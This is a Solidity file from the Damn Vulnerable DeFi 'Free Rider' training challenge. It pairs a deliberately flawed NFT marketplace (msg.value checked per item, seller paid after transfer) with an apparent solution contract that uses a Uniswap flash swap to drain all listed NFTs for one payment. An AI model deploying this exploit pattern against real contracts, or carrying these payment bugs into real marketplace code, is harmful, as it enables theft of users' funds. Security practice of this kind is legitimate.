// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {console} from "forge-std/console.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public offersCount;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    error InvalidPricesAmount();
    error InvalidTokensAmount();
    error InvalidPrice();
    error CallerNotOwner(uint256 tokenId);
    error InvalidApproval();
    error TokenNotOffered(uint256 tokenId);
    error InsufficientPayment();

    constructor(uint256 amount) payable {
        DamnValuableNFT _token = new DamnValuableNFT();
        _token.renounceOwnership();
        for (uint256 i = 0; i < amount;) {
            _token.safeMint(msg.sender);
            unchecked {
                ++i;
            }
        }
        token = _token;
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        uint256 amount = tokenIds.length;
        if (amount == 0) {
            revert InvalidTokensAmount();
        }

        if (amount != prices.length) {
            revert InvalidPricesAmount();
        }

        for (uint256 i = 0; i < amount; ++i) {
            unchecked {
                _offerOne(tokenIds[i], prices[i]);
            }
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        DamnValuableNFT _token = token; // gas savings

        if (price == 0) {
            revert InvalidPrice();
        }

        if (msg.sender != _token.ownerOf(tokenId)) {
            revert CallerNotOwner(tokenId);
        }

        if (_token.getApproved(tokenId) != address(this) && !_token.isApprovedForAll(msg.sender, address(this))) {
            revert InvalidApproval();
        }

        offers[tokenId] = price;

        assembly {
            // gas savings
            sstore(0x02, add(sload(0x02), 0x01))
        }

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}

contract AttackerContract is IERC721Receiver {
    DamnValuableNFT public nft;
    FreeRiderNFTMarketplace public marketplace;
    IUniswapV2Pair public uniswapPair;
    WETH public weth;
    address public recoverAddress;
    address public player;
    uint256[] public tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        DamnValuableNFT _nft,
        FreeRiderNFTMarketplace _marketplace,
        IUniswapV2Pair _uniswapPair,
        WETH _weth,
        address _recoverAddress
    ) {
        nft = _nft;
        marketplace = _marketplace;
        uniswapPair = _uniswapPair;
        weth = _weth;
        recoverAddress = _recoverAddress;
        player = msg.sender;
    }

    function attack() external {
        uniswapPair.swap(15 ether, 0, address(this), "1");
    }

    // callback method after uniswap v2 interaction
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        // console.log(weth.balanceOf(address(this)));
        weth.withdraw(weth.balanceOf(address(this)));

        marketplace.buyMany{value: 15 ether}(tokens);

        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < tokens.length; ++i) {
            nft.safeTransferFrom(address(this), recoverAddress, tokens[i], data);
        }

        // Pay this back to the flashloan (amount + fees)
        uint256 amountToRepay = 15 ether * 1004 / 1000;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);
    }

    receive() external payable {
        // console.log("Received ETH: ", msg.value);
    }

    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
        // console.log("Received NFT with tokenId: ", _tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}
